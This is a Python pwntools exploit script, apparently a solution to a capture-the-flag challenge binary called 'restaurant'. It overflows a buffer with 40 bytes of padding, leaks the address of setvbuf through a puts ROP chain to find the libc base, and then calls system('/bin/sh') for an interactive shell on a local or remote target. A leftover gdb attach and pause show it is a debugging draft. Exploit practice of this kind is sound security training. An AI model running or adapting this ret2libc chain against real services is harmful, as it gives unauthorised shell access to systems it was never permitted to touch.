from pwn import *

def main():
    elf = context.binary = ELF('./restaurant')
    if len(sys.argv) > 1:
        ip, port = sys.argv[1].split(':')
        p = remote(ip, port)
    else:
        p = process(elf.path)

    libc = ELF('./libc.so.6')
    rop = ROP(elf)

    padding = b'A' * 40

    payload = padding
    payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
    payload += p64(elf.got.setvbuf)
    payload += p64(elf.plt.puts)
    payload += p64(elf.symbols.main)

    p.sendline(b'1')
    p.sendafter(b'> \x1b[1;6;32m\n', payload)

    p.recvuntil(b'\xa3\x10@')

    leak = u64(p.recvline().strip().ljust(8, b'\0'))
    log.info(f'{hex(leak)=}')

    libc.address = leak - libc.symbols.setvbuf
    log.info(f'{hex(libc.address)=}')

    gdb.attach(p, gdbscript=f"""
        set disassembly-flavor intel
        break *0x0000000000400eec
        break *{libc.address}
        continue
    """)
    pause()

    payload = padding
    payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
    payload += p64(next(libc.search(b'/bin/sh')))
    payload += p64(rop.find_gadget(['ret'])[0])
    payload += p64(libc.symbols.system)

    p.sendline(b'1')
    p.sendafter(b'> \x1b[1;6;32m\n', payload)

    p.recvuntil(b'\xa3\x10@')

    p.interactive()


if __name__ == '__main__':
    main()